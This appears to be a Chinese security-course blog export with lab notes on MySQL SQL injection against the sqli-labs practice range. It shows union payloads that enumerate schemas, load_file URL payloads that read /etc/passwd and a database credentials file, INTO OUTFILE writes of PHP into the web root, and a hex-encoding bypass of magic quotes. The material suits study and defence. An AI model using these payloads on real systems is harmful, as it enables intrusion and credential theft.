-A<br><br>Database changed<br>mysql&gt; SELECT * FROM <span class="hljs-built_in">users</span> WHERE <span class="hljs-built_in">id</span>=-1 union <span class="hljs-keyword">select</span> 1,group_concat(column_name),3 from information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&#x27;book&#x27;</span> and table_schema=<span class="hljs-string">&#x27;book&#x27;</span>  LIMIT 0,1;<br>+----+------------------------------------------------+----------+<br>| <span class="hljs-built_in">id</span> | username                                       | password |<br>+----+------------------------------------------------+----------+<br>|  1 | book_id,book_title,book_author,submission_date | 3        |<br>+----+------------------------------------------------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><ul><li>4、查询到指定数据</li></ul><p><img src="https://s2.loli.net/2022/11/25/I75x8FwsoA9Tdbp.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; SELECT * FROM <span class="hljs-built_in">users</span> WHERE <span class="hljs-built_in">id</span>=-1 union  <span class="hljs-keyword">select</span> book_id,book_title,book_author from book.book  LIMIT 0,1;<br>+----+----------+----------+<br>| <span class="hljs-built_in">id</span> | username | password |<br>+----+----------+----------+<br>|  1 | Linux    | oldjiang |<br>+----+----------+----------+<br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong>username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同</p><h3 id="三、文件读写函数"><a href="#三、文件读写函数" class="headerlink" title="三、文件读写函数"></a>三、文件读写函数</h3><p>参考地址：<a href="https://www.sqlsec.com/2020/11/mysql.html">https://www.sqlsec.com/2020/11/mysql.html</a></p><p><strong>load_file</strong> 文件读取</p><p><strong>into outfile</strong> 或 <strong>into dumpfile</strong>文件写入</p><p>查询是否有写入的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show global variables like <span class="hljs-string">&#x27;%secure_file_priv%&#x27;</span>;<br>+------------------+-------+<br>| Variable_name    | Value |<br>+------------------+-------+<br>| secure_file_priv |       |<br>+------------------+-------+<br></code></pre></td></tr></table></figure><table><thead><tr><th>Value</th><th>说明</th></tr></thead><tbody><tr><td>NULL</td><td>不允许导入或导出</td></tr><tr><td>&#x2F;tmp</td><td>只允许在 &#x2F;tmp 目录导入导出</td></tr><tr><td>空</td><td>不限制目录</td></tr></tbody></table><p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p><p>在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p><ul><li>文件读取</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>)\G;<br>*************************** 1. row ***************************<br>load_file(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>): root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>libuuid:x:100:101::/var/lib/libuuid:<br>syslog:x:101:104::/home/syslog:/bin/false<br>mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false<br><br>1 row <span class="hljs-keyword">in</span> <span class="hljs-built_in">set</span> (0.00 sec)<br><br>ERROR:<br>No query specified<br><br>mysql&gt;<br></code></pre></td></tr></table></figure><p>读取敏感信息：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p><p>在网站上面读取内容:<code>?id=-2%20union%20select%201,load_file(%27/etc/passwd%27),3</code></p><p><img src="https://s2.loli.net/2022/11/25/dHj6NV9YB3skueT.png" alt="img"></p><p>读取数据库的配置信息</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">?id=-<span class="hljs-number">1</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,load<span class="hljs-constructor">_file(%27<span class="hljs-operator">/</span><span class="hljs-params">var</span><span class="hljs-operator">/</span><span class="hljs-params">www</span><span class="hljs-operator">/</span><span class="hljs-params">html</span><span class="hljs-operator">/</span><span class="hljs-params">sql</span>-<span class="hljs-params">connections</span><span class="hljs-operator">/</span><span class="hljs-params">db</span>-<span class="hljs-params">creds</span>.<span class="hljs-params">inc</span>%27)</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/Z3U8swQPd5bXEIC.png" alt="img"></p><p>右击查看源代码</p><p><img src="https://s2.loli.net/2022/11/25/6BXZ3fnCU4vmoy2.png" alt="img"></p><ul><li>文件写入</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;./php&#x27;</span>;<br>Query OK, 1 row affected (0.00 sec)<br><br>mysql&gt;<br>root@06026a1599f9:/<span class="hljs-comment"># cat /var/lib/mysql/php</span><br>&lt;?php phpinfo() ?&gt;<br><br>mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;/var/www/php&#x27;</span>;<br>ERROR 1 (HY000): Can<span class="hljs-string">&#x27;t create/write to file &#x27;</span>/var/www/php<span class="hljs-string">&#x27; (Errcode: 13)</span><br><span class="hljs-string">mysql&gt;</span><br></code></pre></td></tr></table></figure><p>在linux中默认是对&#x2F;var&#x2F;lib&#x2F;mysql目录下有写入权限对其他目录是没有写入权限。</p><p>对目录修改权限测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;&lt;?php phpinfo() ?&gt;&#x27;</span> into outfile <span class="hljs-string">&#x27;/var/www/html/test.php&#x27;</span>;<br>ERROR 1 (HY000): Can<span class="hljs-string">&#x27;t create/write to file &#x27;</span>/var/www/html/test.php<span class="hljs-string">&#x27; (Errcode: 13)</span><br><span class="hljs-string">mysql&gt; \q</span><br><span class="hljs-string">root@06026a1599f9:/# chmod -Rf 777 /var/www/html/</span><br><span class="hljs-string">root@06026a1599f9:/# mysql</span><br><span class="hljs-string">mysql&gt; select &#x27;</span>&lt;?php phpinfo() ?&gt;<span class="hljs-string">&#x27; into outfile &#x27;</span>/var/www/html/test.php<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">mysql&gt;</span><br></code></pre></td></tr></table></figure><p>在网页上写入</p><p><img src="https://s2.loli.net/2022/11/25/rVWtAyl2Jjk7RGw.png" alt="img"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@06026a1599f9:/var/lib/mysql<span class="hljs-comment"># pwd</span><br>/var/lib/mysql<br>root@06026a1599f9:/var/lib/mysql<span class="hljs-comment"># ls -l test.php</span><br>-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.php<br>root@06026a1599f9:/var/lib/mysql<span class="hljs-comment"># cat test.php</span><br>1       &lt;?php phpinfo() ?&gt;      3<br>root@06026a1599f9:/var/lib/mysql<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="四、魔术引号开关"><a href="#四、魔术引号开关" class="headerlink" title="四、魔术引号开关"></a>四、魔术引号开关</h3><p>   魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义，这个的作用跟addslashes()的作用完全相同。</p><pre><code class="hljs">  正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。</code></pre><p>​        简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http:&#x2F;&#x2F;域名&#x2F;?c&#x3D;xxx&amp;a&#x3D;xxx&amp;user&#x3D;xxx，现在我们想查询一个叫codeman的人的信息，那么user&#x3D;codeman，后台接收到参数之后，执行类似于下面的SQL语句。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT * FROM `user` WHERE `user` = <span class="hljs-string">&#x27;codeman&#x27;</span>;<br></code></pre></td></tr></table></figure><p>​        如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user&#x3D;codeman’or’1’&#x3D;’1，传到后台执行的SQL语句变成：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">SELECT * FROM `user` WHERE `user` = <span class="hljs-string">&#x27;codeman&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span> or <span class="hljs-string">&#x27;1&#x27;</span>;<br></code></pre></td></tr></table></figure><p> 为什么在PHP5.4.0及其之后PHP版本中被取消了呢？  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)<br>Copyright (c) 1997-2014 The PHP Group<br>Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies<br>    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies<br>root@06026a1599f9:/<span class="hljs-comment"># grep magic /etc/php5/apache2/php.ini</span><br>root@06026a1599f9:/<span class="hljs-comment"># grep magic /etc/php5/cli/php.ini</span><br></code></pre></td></tr></table></figure><p>(1)可移植性:</p><p>编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 </p><p>(2）性能</p><p>​        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。</p><p>（3）方便</p><p>由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 ‘。针对这个问题，可以使用 stripslashes() 函数处理。[</p><p>](<a href="https://blog.csdn.net/hyh1123176978/article/details/53893579">https://blog.csdn.net/hyh1123176978/article/details/53893579</a>)</p><p><strong>phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关</strong></p><p><img src="https://s2.loli.net/2022/11/25/Yf2njH1QygP4oza.png" alt="img"></p><p>选择SQL注入的关卡1阅读源码<code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code>这一句中我们要是想注入的话必须让前面的<code>’</code>闭合，但是我们开启了魔术引号开关我发生这样的事情。</p><p><img src="https://s2.loli.net/2022/11/25/3YK75y1ENovXDtM.png" alt="img"></p><p>就是在我们注入的时候添加的<code>’</code>会在之后会自动添加<code>\&#39;</code>将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。</p><p><img src="https://s2.loli.net/2022/11/25/XyQaPeukpRfq2sV.png" alt="img"></p><p><img src="https://s2.loli.net/2022/11/25/zHYq4Sly9sNDmKP.png" alt="img"></p><p>由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示</p><p>开启了魔术引号之后</p><p><img src="https://s2.loli.net/2022/11/25/Ikte8ZyF5fCROEg.png" alt="img"></p><p><strong>绕过方法</strong></p><p>采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。</p><p>编码软件:winhex</p><h3 id="五、int函数"><a href="#五、int函数" class="headerlink" title="五、int函数"></a>五、int函数</h3><p>对输入的数字进行判断是否</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span>(is_int(<span class="hljs-variable">$id</span>))&#123;<br><span class="hljs-variable">$sql</span>=<span class="hljs-string">&quot;SELECT * FROM users WHERE id=<span class="hljs-variable">$id</span> LIMIT 0,1&quot;</span>;<br><span class="hljs-built_in">echo</span> <span class="hljs-variable">$sql</span>;<br><span class="hljs-variable">$result</span>=mysql_query(<span class="hljs-variable">$sql</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;ni shi ge jj?&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/11/25/z9XPR241TvUOWly.png" alt="img"></p><p>防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>小迪-day13(MySQL注入)</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小迪-day12(SQL注入简要概述)</title>
    <link href="/2023/08/24/%E5%B0%8F%E8%BF%AA-day12(SQL%E6%B3%A8%E5%85%A5%E7%AE%80%E8%A6%81%E6%A6%82%E8%BF%B0)/"/>
    <url>/2023/08/24/%E5%B0%8F%E8%BF%AA-day12(SQL%E6%B3%A8%E5%85%A5%E7%AE%80%E8%A6%81%E6%A6%82%E8%BF%B0)/</url>
    
    <content type="html"><![CDATA[<img src="https://s2.loli.net/2022/11/25/ZX8G9bETWCt2VRM.png" alt="web-漏洞小迪安全.png" style="zoom:67%;" /><h1 id="1、相关sql函数、语句"><a href="#1、相关sql函数、语句" class="headerlink" title="1、相关sql函数、语句"></a>1、相关sql函数、语句</h1><h2 id="1-1-count"><a href="#1-1-count" class="headerlink" title="1.1  count()"></a>1.1  count()</h2><h3 id="1-1-1-count-column-name"><a href="#1-1-1-count-column-name" class="headerlink" title="1.1.1 count(column_name)"></a>1.1.1 count(<em>column_name</em>)</h3><p>​count(<em>column_name</em>)是计算数据库表中指定列有多少行，</p><p>​例： </p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> COUNT(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">FROM</span> <span class="hljs-built_in">table_name</span><br></code></pre></td></tr></table></figure><h3 id="1-1-2-count"><a href="#1-1-2-count" class="headerlink" title="1.1.2 count(*)"></a>1.1.2 count(*)</h3><p>可以计算表中有多少行（有多少条数据）表中记录数</p><h2 id="1-2-sum"><a href="#1-2-sum" class="headerlink" title="1.2 sum()"></a>1.2 sum()</h2><p>返回数值列的总和（只能运用于数值列）</p><h2 id="1-3-exists"><a href="#1-3-exists" class="headerlink" title="1.3 exists()"></a>1.3 exists()</h2><p>exists()用于判断查询字句是否有记录，如果有一条或多条记录，则返回True，没有记录则返回False</p><h3 id="EXISTS-语法"><a href="#EXISTS-语法" class="headerlink" title="EXISTS 语法"></a>EXISTS 语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s)<br><span class="hljs-keyword">FROM</span> table_name<br><span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">EXISTS</span><br>(<span class="hljs-keyword">SELECT</span> column_name <span class="hljs-keyword">FROM</span> table_name <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">condition</span>);<br></code></pre></td></tr></table></figure><h2 id="1-4-order-by"><a href="#1-4-order-by" class="headerlink" title="1.4 order by"></a>1.4 order by</h2><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">ORDER</span> <span class="hljs-title">BY</span> 语句用于根据指定的  列  对结果集进行排序。<br><br><span class="hljs-keyword">ORDER</span> <span class="hljs-title">BY</span> 语句默认按照升序对记录进行排序。<br><br>如果您希望按照降序对记录进行排序，可以使用 DESC 关键字。<br></code></pre></td></tr></table></figure><p>order by 根据<strong>列</strong>来进行排序，后面跟上    列名 asc(升序，默认)&#x2F;desc（降序）</p><p>例如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> Company, OrderNumber <span class="hljs-keyword">FROM</span> Orders <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> Company<br></code></pre></td></tr></table></figure><p>如果order by 后面的列数，大于表的列数，就会报错。</p><p>可以在order by 后面写数字，代表一个临时的列（详见标题2），如果数字数大于表的列数就会报错</p><p>例如：</p><img src="https://s2.loli.net/2022/11/25/qovjMO68S4bLWhY.png" alt="image-20221108183335707" style="zoom:33%;" /><p>此时有1，2，3，4四个数字代表四个临时列，由于表只有三个列，所以报错</p><h2 id="1-5-union"><a href="#1-5-union" class="headerlink" title="1.5 union"></a>1.5 union</h2><p>union 联合查询，将多条查询语句的结果集放在一个表中</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-built_in">UNION</span> 操作符用于合并两个或多个 <span class="hljs-built_in">SELECT</span> 语句的结果集。<br><br>请注意，<span class="hljs-built_in">UNION</span> 内部的每个 <span class="hljs-built_in">SELECT</span> 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 <span class="hljs-built_in">SELECT</span> 语句中的列的顺序必须相同。<br></code></pre></td></tr></table></figure><h3 id="SQL-UNION-语法"><a href="#SQL-UNION-语法" class="headerlink" title="SQL UNION 语法"></a>SQL UNION 语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table1<br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> column_name(s) <span class="hljs-keyword">FROM</span> table2;<br></code></pre></td></tr></table></figure><p><strong>注释：</strong>默认地，UNION 操作符选取不同的值（结果集中没有重复的）。</p><p>​如果允许重复的值，请使用 <strong>UNION ALL</strong>。</p><h3 id="SQL-UNION-ALL-语法"><a href="#SQL-UNION-ALL-语法" class="headerlink" title="SQL UNION ALL 语法"></a>SQL UNION ALL 语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span>column_name(s)<span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-operator">*</span>table1<span class="hljs-operator">*</span><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span>column_name(s)<span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-operator">*</span>table2<span class="hljs-operator">*</span>;<br></code></pre></td></tr></table></figure><p><strong>注释：</strong>UNION 结果集中的列名总是等于 UNION 中第一个 SELECT 语句中的列名。</p><h2 id="1-6-group-concat"><a href="#1-6-group-concat" class="headerlink" title="1.6 group_concat()"></a>1.6 group_concat()</h2><p>group_concat()函数可以将组中的字符串连接成为具有各种选项的单个字符串。</p><p>最简单用法，可以把多个结果用逗号分开，形成一个字符串</p><h1 id="2、语句-select-1-from-是什么？"><a href="#2、语句-select-1-from-是什么？" class="headerlink" title="2、语句 select 1 from  是什么？"></a>2、语句 select 1 from  是什么？</h1><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> ...   与 <span class="hljs-keyword">select</span> anycol(目的表集合中的任意一行）<span class="hljs-keyword">from</span> ...  <br>与 <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> ...  都可以用来查询数据是否有记录<br></code></pre></td></tr></table></figure><p>select 1 from 中的1是一常量（可以为任意数值），查到的所有行的值都是它，<strong>但从效率上来说，1&gt;anycol&gt;*，因为不用查字典表</strong>。</p><h2 id="测试场景："><a href="#测试场景：" class="headerlink" title="测试场景："></a><strong>测试场景：</strong></h2><p>kc表是一个数据表，假设表的行数为10行。</p><p><img src="https://s2.loli.net/2022/11/25/o5WOMmjNvEsld94.jpg" alt="img"></p><p><strong>1：select 1 from kc   增加临时列，每行的列值是写在select后的数，这条sql语句中是1</strong></p><p><strong>2：select count(1) from kc  不管count(a)的a值如何变化，得出的值总是kc表的行数</strong></p><p><strong>3：select sum(1) from kc  计算临时列的和</strong></p><p> 在MySQL中用 1 测试了一下，发现结果如下：</p><p>1：测试结果，得出一个行数和kc表行数一样的临时列（暂且这么叫，我也不知道该叫什么），每行的列值是1；</p><p>2：得出一个数，该数是kc表的行数；</p><p>3：得出一个数，该数是kc表的行数；</p><p>然后我又用“2”测试，结果如下：</p><p>1：得出一个行数和kc表行数一样的临时列，每行的列值是2；</p><p>2：得出一个数，该数是kc表的行数；</p><p>3：得出一个数，该数是kc表的行数×2的数</p><p>然后我又用更大的数测试：</p><p>1：得出一个行数和kc表行数一样的临时列，每行的列值是我写在select后的数；</p><p>2：还是得出一个数，该数是kc表的行数；</p><p>3：得出一个数，该数是table表的行数×写在select后的数</p><p><strong>结果图：</strong></p><p><strong><img src="https://s2.loli.net/2022/11/25/vAiHyD2wtX8fjOK.jpg" alt="img" style="zoom:50%;" /></strong></p><p><strong><img src="https://s2.loli.net/2022/11/25/cBtN5WGTurUaIXA.jpg" alt="img" style="zoom:50%;" /><br> 注意观察下面的两幅图的区别。</strong></p><p>**<img src="https://s2.loli.net/2022/11/25/RJhjsC491y2wVmS.jpg" alt="img" style="zoom:50%;" /><br>** </p><p>**<img src="https://s2.loli.net/2022/11/25/ftb8u9nkSK6M1PI.jpg" alt="img" style="zoom:50%;" /></p><p>** </p><h2 id="综上所述："><a href="#综上所述：" class="headerlink" title="综上所述："></a><strong>综上所述：</strong></h2><p>​<strong>第一种的写法是增加临时列，每行的列值是写在select后的数；第二种是不管count(a)的a值如何变化，得出的值总是table表的行数；第三种是计算临时列的和</strong>。</p><p>​当不需要知道结果是什么，只需要知道有没有结果的时候，可以使用select 1 作为子查询结果是否存在判断，这样可以提高性能。</p><h1 id="3、SQL注入"><a href="#3、SQL注入" class="headerlink" title="3、SQL注入"></a>3、SQL注入</h1><h2 id="1-1-前言"><a href="#1-1-前言" class="headerlink" title="1.1 前言"></a>1.1 前言</h2><p>​SQL注入漏洞将是重点部分，其中SQL注入又非常复杂，区分各种数据库类型，提交方法，数据类型等注入，我们需要按部就班的学习，才能学会相关SQL注入的核心。同样此类漏洞是WEB安全中严重的安全漏洞，学习如何利用，挖掘，修复也是很重要的。</p><img src="https://s2.loli.net/2022/11/25/qpZzRKdtLDJEGkN.png" alt="SQL注入-小迪安全.png" style="zoom: 50%;" /><p>​SQL注入简单的说就是，通过添加一些sql语句在一些原有sql语句中可注入的地方，达到改写sql语句功能的目的，从而获取到数据库相关信息（高危）</p><h2 id="1-2-MySQL注入"><a href="#1-2-MySQL注入" class="headerlink" title="1.2 MySQL注入"></a>1.2 MySQL注入</h2><img src="https://s2.loli.net/2022/11/25/e2zLhvIgK85MciB.png" alt="mysql注入-小迪.png" style="zoom:50%;" /><h2 id="1-3-sqlilabs靶场搭建"><a href="#1-3-sqlilabs靶场搭建" class="headerlink" title="1.3 sqlilabs靶场搭建"></a>1.3 sqlilabs靶场搭建</h2><p>下载文件放进phpstudy的www文件下，然后该配置文件，更改数据库用户名，密码，</p><p>然后进入靶场初始化数据库</p><h3 id="实例：less-2"><a href="#实例：less-2" class="headerlink" title="实例：less-2"></a>实例：less-2</h3><p><img src="https://s2.loli.net/2022/11/25/wKnEYINf7lFbuto.png" alt="image-20221108184147135"></p><p>查看源码：</p><img src="https://s2.loli.net/2022/11/25/u3E6FPSwCkJGqht.png" alt="image-20221108184248152" style="zoom: 33%;" /><p>发现源码中$id变量接受后没有做任何限制，为恶意sql注入创造了条件。</p><p>查询数据库security可知，该数据库有4张表。</p><img src="https://s2.loli.net/2022/11/25/sOTHxQ46W8lVZBa.png" alt="image-20221108184544871" style="zoom:50%;" /><p>查询users表：</p><img src="https://s2.loli.net/2022/11/25/bwNR8rjmUo6yW3g.png" alt="image-20221108184651816" style="zoom:33%;" /><p>查询emails表：</p><img src="https://s2.loli.net/2022/11/25/zErfVLBxQ1FMUSe.png" alt="image-20221108184723978" style="zoom:33%;" /><p>在数据库中执行如下语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,email_id,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> emails <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>;<br></code></pre></td></tr></table></figure><p>可得：</p><img src="https://s2.loli.net/2022/11/25/3M2mwQZk7EUi9Hv.png" alt="image-20221108184916746" style="zoom:50%;" /><p>***如果执行如下语句：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,email_id,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> emails <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users;<br></code></pre></td></tr></table></figure><p>则表结构为:</p><img src="https://s2.loli.net/2022/11/25/5lObDYhqiHEAjkt.png" alt="image-20221108190740724" style="zoom:50%;" /><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">说明：如果使用<span class="hljs-built_in">union</span>联合查询，产生表的列名为第一条<span 